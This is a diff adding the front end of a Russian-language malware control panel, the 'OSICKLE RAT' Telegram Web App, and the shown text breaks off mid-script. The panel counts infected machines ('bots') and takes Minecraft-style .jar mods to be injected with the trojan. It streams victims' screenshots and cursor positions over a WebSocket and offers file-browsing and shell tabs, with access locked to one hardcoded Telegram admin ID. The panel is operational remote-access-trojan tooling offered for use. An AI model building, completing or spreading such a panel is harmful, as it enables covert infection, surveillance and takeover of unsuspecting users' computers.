@@ -1,0 +1,2033 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OSICKLE RAT Panel</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        :root {
+            --bg-primary: #06060e;
+            --bg-secondary: #0c0c1a;
+            --bg-card: #111128;
+            --bg-card-hover: #181840;
+            --border-color: #1f1f4a;
+            --border-glow: #00d4ff;
+            --text-primary: #f0f0ff;
+            --text-secondary: #7777aa;
+            --accent: #00d4ff;
+            --accent-glow: rgba(0, 212, 255, 0.25);
+            --accent2: #7b2ffc;
+            --gradient: linear-gradient(135deg, #00d4ff, #7b2ffc, #ff006e);
+            --shadow: 0 8px 40px rgba(0, 212, 255, 0.12);
+            --radius: 16px;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            padding: 12px;
+            padding-bottom: 80px;
+            overflow-x: hidden;
+        }
+
+        /* ANIMATIONS */
+        @keyframes glow {
+            0%,
+            100% {
+                box-shadow: 0 0 30px var(--accent-glow);
+            }
+            50% {
+                box-shadow: 0 0 60px var(--accent-glow), 0 0 80px rgba(123, 47, 252, 0.08);
+            }
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.2;
+            }
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes float {
+            0%,
+            100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-6px);
+            }
+        }
+
+        @keyframes rotateBorder {
+            0% {
+                border-color: #00d4ff;
+            }
+            33% {
+                border-color: #7b2ffc;
+            }
+            66% {
+                border-color: #ff006e;
+            }
+            100% {
+                border-color: #00d4ff;
+            }
+        }
+
+        @keyframes typing {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        @keyframes progressPulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .animate-in {
+            animation: slideUp 0.5s ease forwards;
+        }
+
+        /* ACCESS DENIED */
+        .access-denied {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--bg-primary);
+            z-index: 999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .access-denied.show {
+            display: flex;
+        }
+
+        .access-denied .lock {
+            font-size: 64px;
+            margin-bottom: 20px;
+            animation: float 3s infinite;
+        }
+
+        .access-denied h1 {
+            font-size: 24px;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 12px;
+        }
+
+        .access-denied p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            max-width: 320px;
+            line-height: 1.6;
+        }
+
+        .access-denied .code {
+            font-family: 'Consolas', monospace;
+            background: var(--bg-card);
+            padding: 8px 20px;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+            color: var(--accent);
+            font-size: 12px;
+            margin-top: 12px;
+        }
+
+        /* HEADER */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 0;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 16px;
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: 900;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header-title .icon {
+            font-size: 24px;
+            -webkit-text-fill-color: initial;
+        }
+
+        .header-status {
+            font-size: 10px;
+            color: #4caf50;
+            background: rgba(76, 175, 80, 0.08);
+            padding: 4px 14px;
+            border-radius: 20px;
+            border: 1px solid rgba(76, 175, 80, 0.15);
+            animation: pulse 2s infinite;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .header-status .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #4caf50;
+            display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+
+        /* STATS */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            padding: 12px 8px;
+            border-radius: var(--radius);
+            text-align: center;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--gradient);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--accent);
+            animation: glow 2s infinite;
+        }
+
+        .stat-card:hover::after {
+            opacity: 1;
+        }
+
+        .stat-number {
+            font-size: 22px;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+        }
+
+        .stat-label {
+            font-size: 8px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-top: 3px;
+            font-weight: 600;
+            position: relative;
+        }
+
+        /* UPLOAD ZONE */
+        .upload-zone {
+            background: var(--bg-card);
+            border: 2px dashed var(--border-color);
+            border-radius: var(--radius);
+            padding: 18px;
+            text-align: center;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .upload-zone::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: var(--gradient);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            border-radius: 50%;
+        }
+
+        .upload-zone:hover {
+            border-color: var(--accent);
+            background: var(--bg-card-hover);
+            transform: scale(1.01);
+        }
+
+        .upload-zone.dragover {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.04);
+            animation: rotateBorder 1.5s infinite;
+        }
+
+        .upload-zone .icon {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 6px;
+            animation: float 3s infinite;
+            position: relative;
+        }
+
+        .upload-zone .text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            position: relative;
+        }
+
+        .upload-zone .sub {
+            font-size: 10px;
+            color: #444477;
+            margin-top: 4px;
+            position: relative;
+        }
+
+        #fileInput {
+            display: none;
+        }
+
+        /* PROGRESS */
+        .progress-container {
+            display: none;
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid var(--border-color);
+        }
+
+        .progress-container.show {
+            display: block;
+            animation: slideUp 0.4s ease;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: var(--bg-primary);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.3s ease;
+            animation: progressPulse 1s infinite;
+        }
+
+        .progress-text {
+            font-size: 12px;
+            color: var(--text-secondary);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        /* BOTS LIST */
+        .bots-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 16px;
+            max-height: 350px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .bots-list::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .bots-list::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+
+        .bots-list::-webkit-scrollbar-thumb {
+            background: var(--accent);
+            border-radius: 10px;
+        }
+
+        .bot-item {
+            background: var(--bg-card);
+            padding: 12px 16px;
+            border-radius: var(--radius);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid var(--border-color);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            animation: slideUp 0.4s ease forwards;
+        }
+
+        .bot-item::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: var(--gradient);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .bot-item:hover {
+            transform: translateX(5px);
+            border-color: var(--accent);
+            background: var(--bg-card-hover);
+        }
+
+        .bot-item:hover::before {
+            opacity: 1;
+        }
+
+        .bot-item.active {
+            border-color: var(--accent);
+            background: var(--bg-card-hover);
+            animation: glow 2s infinite;
+        }
+
+        .bot-item.active::before {
+            opacity: 1;
+        }
+
+        .bot-info {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .bot-name {
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .bot-name .badge {
+            font-size: 8px;
+            background: rgba(0, 212, 255, 0.12);
+            color: var(--accent);
+            padding: 1px 8px;
+            border-radius: 10px;
+            font-weight: 600;
+        }
+
+        .bot-detail {
+            font-size: 11px;
+            color: var(--text-secondary);
+        }
+
+        .bot-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            transition: all 0.3s ease;
+        }
+
+        .status-dot.online {
+            background: #4caf50;
+            box-shadow: 0 0 16px rgba(76, 175, 80, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.offline {
+            background: #444477;
+        }
+
+        .bot-os {
+            font-size: 9px;
+            color: var(--text-secondary);
+            background: var(--bg-primary);
+            padding: 2px 10px;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+            font-weight: 500;
+        }
+
+        /* STREAM PREVIEW */
+        .stream-preview {
+            background: var(--bg-card);
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            padding: 14px;
+            margin-bottom: 16px;
+            display: none;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+        }
+
+        .stream-preview.active {
+            display: block;
+            animation: slideUp 0.5s ease;
+            border-color: var(--accent);
+            animation: glow 3s infinite;
+        }
+
+        .stream-preview .stream-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .stream-preview .stream-title {
+            font-size: 12px;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+
+        .stream-preview .stream-title .live {
+            color: #ff3355;
+            font-weight: 800;
+            animation: pulse 1s infinite;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .stream-preview .stream-title .bot-name {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .stream-preview .stream-frame {
+            background: var(--bg-primary);
+            border-radius: 12px;
+            min-height: 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+            cursor: crosshair;
+        }
+
+        .stream-preview .stream-frame img {
+            width: 100%;
+            border-radius: 12px;
+            max-height: 350px;
+            object-fit: contain;
+            pointer-events: none;
+        }
+
+        .stream-preview .stream-frame .placeholder {
+            color: var(--text-secondary);
+            font-size: 13px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .stream-preview .stream-frame .placeholder .icon {
+            font-size: 36px;
+            opacity: 0.3;
+        }
+
+        .stream-preview .stream-controls {
+            display: flex;
+            gap: 6px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        .stream-preview .stream-controls button {
+            flex: 1;
+            min-width: 50px;
+            padding: 8px 6px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            background: var(--bg-primary);
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 10px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .stream-preview .stream-controls button:hover {
+            border-color: var(--accent);
+            background: var(--bg-card-hover);
+            color: var(--text-primary);
+        }
+
+        .stream-preview .stream-controls button.active {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.08);
+            color: var(--accent);
+        }
+
+        .stream-preview .stream-controls button.danger:hover {
+            border-color: #ff3355;
+            color: #ff3355;
+        }
+
+        /* BOTTOM MENU */
+        .bottom-menu {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(6, 6, 14, 0.96);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-top: 1px solid var(--border-color);
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            padding: 6px 0 14px;
+            z-index: 100;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            padding: 4px 0;
+            position: relative;
+            border-radius: 0;
+        }
+
+        .menu-btn::after {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 2px;
+            background: var(--gradient);
+            transition: width 0.3s ease;
+            border-radius: 2px;
+        }
+
+        .menu-btn.active {
+            color: var(--accent);
+        }
+
+        .menu-btn.active::after {
+            width: 50%;
+        }
+
+        .menu-btn .icon {
+            font-size: 20px;
+            display: block;
+            transition: transform 0.3s ease;
+        }
+
+        .menu-btn:hover .icon {
+            transform: scale(1.1);
+        }
+
+        .menu-btn .label {
+            font-size: 8px;
+            margin-top: 2px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+
+        /* MODAL */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            z-index: 200;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .modal.show {
+            display: block;
+            animation: slideUp 0.3s ease;
+        }
+
+        .modal-content {
+            background: var(--bg-secondary);
+            border-radius: 20px;
+            padding: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .modal-title {
+            font-size: 17px;
+            font-weight: 700;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .modal-close {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-close:hover {
+            background: var(--bg-card-hover);
+            color: var(--text-primary);
+            border-color: var(--accent);
+        }
+
+        /* MODULES GRID */
+        .modules-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin: 12px 0;
+        }
+
+        .module-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 14px 4px;
+            text-align: center;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .module-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .module-btn:hover {
+            transform: translateY(-3px);
+            border-color: var(--accent);
+            animation: glow 2s infinite;
+        }
+
+        .module-btn:hover::before {
+            opacity: 0.04;
+        }
+
+        .module-btn:active {
+            transform: scale(0.93);
+        }
+
+        .module-btn .icon {
+            font-size: 22px;
+            display: block;
+            margin-bottom: 4px;
+            position: relative;
+        }
+
+        .module-btn .name {
+            font-size: 8px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            position: relative;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        /* COMMAND INPUT */
+        .cmd-area {
+            margin-top: 14px;
+        }
+
+        .cmd-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 13px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .cmd-input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 30px var(--accent-glow);
+        }
+
+        .cmd-input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: var(--gradient);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+
+        .btn-primary.secondary {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-primary.secondary:hover {
+            border-color: var(--accent);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* FILE LIST */
+        .file-list {
+            max-height: 250px;
+            overflow-y: auto;
+            margin-top: 10px;
+        }
+
+        .file-list::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .file-list::-webkit-scrollbar-thumb {
+            background: var(--accent);
+            border-radius: 10px;
+        }
+
+        .file-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            border-radius: 10px;
+            background: var(--bg-card);
+            margin-bottom: 4px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+        .file-item:hover {
+            border-color: var(--accent);
+            background: var(--bg-card-hover);
+        }
+
+        .file-item .name {
+            font-size: 12px;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .file-item .size {
+            font-size: 9px;
+            color: #444477;
+        }
+
+        .file-item .actions {
+            display: flex;
+            gap: 4px;
+        }
+
+        .file-item .actions button {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.3s ease;
+            padding: 2px 6px;
+            border-radius: 6px;
+        }
+
+        .file-item .actions button:hover {
+            color: var(--accent);
+            background: rgba(0, 212, 255, 0.06);
+        }
+
+        .file-item .actions button.danger:hover {
+            color: #ff3355;
+            background: rgba(255, 51, 85, 0.06);
+        }
+
+        /* FULLSCREEN STREAM */
+        .fullscreen-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000;
+            z-index: 500;
+            cursor: crosshair;
+        }
+
+        .fullscreen-overlay.active {
+            display: block;
+        }
+
+        .fullscreen-overlay img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .fullscreen-overlay .close-fullscreen {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            padding: 10px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 14px;
+            z-index: 501;
+            backdrop-filter: blur(12px);
+            transition: all 0.3s ease;
+        }
+
+        .fullscreen-overlay .close-fullscreen:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .fullscreen-overlay .cursor-indicator {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 502;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+
+        .fullscreen-overlay .cursor-indicator.active {
+            display: block;
+        }
+
+        /* TOAST */
+        .toast {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 12px 20px;
+            font-size: 12px;
+            color: var(--text-primary);
+            box-shadow: var(--shadow);
+            z-index: 300;
+            display: none;
+            animation: slideUp 0.3s ease;
+            max-width: 90%;
+            font-weight: 500;
+            backdrop-filter: blur(12px);
+        }
+
+        .toast.show {
+            display: block;
+        }
+
+        .toast.success {
+            border-color: #4caf50;
+            background: rgba(76, 175, 80, 0.08);
+        }
+
+        .toast.error {
+            border-color: #ff3355;
+            background: rgba(255, 51, 85, 0.08);
+        }
+
+        /* TYPING INDICATOR */
+        .typing-indicator {
+            display: none;
+            align-items: center;
+            gap: 4px;
+            padding: 4px 12px;
+            background: var(--bg-card);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            margin: 8px 0;
+        }
+
+        .typing-indicator.show {
+            display: inline-flex;
+        }
+
+        .typing-indicator span {
+            width: 6px;
+            height: 6px;
+            background: var(--accent);
+            border-radius: 50%;
+            animation: typing 1.4s infinite;
+        }
+
+        .typing-indicator span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .typing-indicator span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 480px) {
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .modules-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            .modal-content {
+                padding: 16px;
+            }
+            .header-title {
+                font-size: 17px;
+            }
+            .header-title .icon {
+                font-size: 20px;
+            }
+            .upload-zone {
+                padding: 14px;
+            }
+            .upload-zone .icon {
+                font-size: 22px;
+            }
+            .stream-preview .stream-frame {
+                min-height: 140px;
+            }
+            .access-denied h1 {
+                font-size: 20px;
+            }
+            .access-denied .lock {
+                font-size: 48px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .modules-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .header-status {
+                font-size: 8px;
+                padding: 2px 10px;
+            }
+            .stat-number {
+                font-size: 18px;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 3px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent);
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ACCESS DENIED -->
+    <div class="access-denied" id="accessDenied">
+        <div class="lock">🔒</div>
+        <h1>Доступ запрещён</h1>
+        <p>Эта панель управления предназначена только для авторизованных администраторов.</p>
+        <div class="code">OSICKLE RAT v3.0</div>
+    </div>
+
+    <!-- FULLSCREEN OVERLAY -->
+    <div class="fullscreen-overlay" id="fullscreenOverlay">
+        <button class="close-fullscreen" onclick="closeFullscreen()">✕ Выйти</button>
+        <div class="cursor-indicator" id="cursorIndicator"></div>
+        <img id="fullscreenImg" src="" alt="Stream" />
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="mainContent" style="display:none;">
+
+        <!-- HEADER -->
+        <div class="header">
+            <span class="header-title">
+                <span class="icon">🔪</span> OSICKLE
+            </span>
+            <span class="header-status">
+                <span class="dot"></span> <span id="onlineCount">0 online</span>
+            </span>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalBots">0</div>
+                <div class="stat-label">Боты</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="onlineBots">0</div>
+                <div class="stat-label">Онлайн</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="infectedMods">0</div>
+                <div class="stat-label">Заражено</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeSessions">0</div>
+                <div class="stat-label">Активно</div>
+            </div>
+        </div>
+
+        <!-- UPLOAD ZONE -->
+        <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
+            <span class="icon">📦</span>
+            <div class="text">Загрузи мод для заражения</div>
+            <div class="sub">Перетащи или нажми чтобы выбрать .jar</div>
+            <input type="file" id="fileInput" accept=".jar" />
+        </div>
+
+        <!-- PROGRESS -->
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-text">
+                <span id="progressLabel">⏳ Инжекция...</span>
+                <span id="progressPercent">0%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <!-- STREAM PREVIEW -->
+        <div class="stream-preview" id="streamPreview">
+            <div class="stream-header">
+                <span class="stream-title">
+                    <span class="live">● LIVE</span>
+                    <span class="bot-name" id="streamBotName">—</span>
+                    <span style="font-size:9px;color:#888;" id="streamResolution"></span>
+                </span>
+                <span style="font-size:10px;color:var(--text-secondary);" id="streamFPS">FPS: 0</span>
+            </div>
+            <div class="stream-frame" id="streamFrame">
+                <span class="placeholder">
+                    <span class="icon">📡</span>
+                    Ожидание скриншота...
+                </span>
+            </div>
+            <div class="stream-controls">
+                <button class="active" onclick="toggleStream()">⏸ Пауза</button>
+                <button onclick="requestScreenshot()">📸 Запрос</button>
+                <button onclick="setStreamInterval(1000)">1s</button>
+                <button onclick="setStreamInterval(3000)">3s</button>
+                <button onclick="setStreamInterval(5000)">5s</button>
+                <button onclick="toggleFullscreen()" style="flex:0.5;">⛶</button>
+            </div>
+            <div class="typing-indicator" id="typingIndicator">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+
+        <!-- BOTS LIST -->
+        <div class="bots-list" id="botsList"></div>
+
+        <!-- BOTTOM MENU -->
+        <div class="bottom-menu">
+            <button class="menu-btn active" data-tab="bots">
+                <span class="icon">📡</span>
+                <span class="label">Боты</span>
+            </button>
+            <button class="menu-btn" data-tab="modules">
+                <span class="icon">🎯</span>
+                <span class="label">Модули</span>
+            </button>
+            <button class="menu-btn" data-tab="stream">
+                <span class="icon">📺</span>
+                <span class="label">Эфир</span>
+            </button>
+            <button class="menu-btn" data-tab="files">
+                <span class="icon">📁</span>
+                <span class="label">Файлы</span>
+            </button>
+            <button class="menu-btn" data-tab="shell">
+                <span class="icon">💻</span>
+                <span class="label">Shell</span>
+            </button>
+        </div>
+
+        <!-- MODAL -->
+        <div class="modal" id="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <span class="modal-title" id="modalTitle">🎯 Модули</span>
+                    <button class="modal-close" onclick="closeModal()">✕</button>
+                </div>
+                <div id="modalBody"></div>
+            </div>
+        </div>
+
+        <!-- TOAST -->
+        <div class="toast" id="toast"></div>
+
+    </div>
+
+    <script>
+        // ============================================
+        // ADMIN CHECK
+        // ============================================
+        const ALLOWED_ADMIN_ID = '7239870497';
+        const tg = window.Telegram.WebApp;
+        const user = tg.initDataUnsafe?.user;
+
+        let isAdmin = false;
+        if (user && user.id && String(user.id) === ALLOWED_ADMIN_ID) {
+            isAdmin = true;
+        }
+
+        if (!isAdmin) {
+            document.getElementById('accessDenied').classList.add('show');
+            document.getElementById('mainContent').style.display = 'none';
+            throw new Error('Access Denied');
+        }
+
+        document.getElementById('accessDenied').classList.remove('show');
+        document.getElementById('mainContent').style.display = 'block';
+
+        // ============================================
+        // CORE
+        // ============================================
+
+        tg.expand();
+
+        let selectedBot = null;
+        let bots = [];
+        let currentTab = 'bots';
+        let streamInterval = 3000;
+        let streamActive = false;
+        let streamTimer = null;
+        let isStreamPaused = false;
+        let fullscreenActive = false;
+        let ws = null;
+        let botResults = {};
+
+        // ===== TOAST =====
+        function showToast(msg, type = '') {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.className = 'toast show ' + type;
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => toast.className = 'toast', 3500);
+        }
+
+        // ===== WEBSOCKET =====
+        function connectWebSocket() {
+            try {
+                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+                const host = window.location.hostname;
+                const port = ':8080';
+                ws = new WebSocket(protocol + '//' + host + port + '/ws');
+
+                ws.onopen = () => {
+                    showToast('🔌 WebSocket подключен');
+                };
+
+                ws.onmessage = (event) => {
+                    try {
+                        const data = JSON.parse(event.data);
+                        if (data.type === 'screenshot') {
+                            handleScreenshot(data.botId, data.image);
+                        } else if (data.type === 'cursor') {
+                            handleCursor(data.x, data.y);
+                        } else if (data.type === 'result') {
+                            handleResult(data.botId, data.command, data.result);
+                        } else if (data.type === 'typing') {
+                            handleTyping(data.botId, data.status);
+                        } else if (data.type === 'bot_update') {
+                            loadBots();
+                        } else if (data.type === 'inject_progress') {
+                            updateProgress(data.percent, data.status);
+                        } else if (data.type === 'inject_done') {
+                            onInjectDone(data.fileName, data.data);
+                        }
+                    } catch (e) {}
+                };
+
+                ws.onclose = () => {
+                    showToast('⚠️ WebSocket отключен, переподключение...', 'error');
+                    setTimeout(connectWebSocket, 3000);
+                };
+
+                ws.onerror = () => {};
+            } catch (e) {
+                setTimeout(connectWebSocket, 5000);
+            }
+        }
+
+        function wsSend(data) {
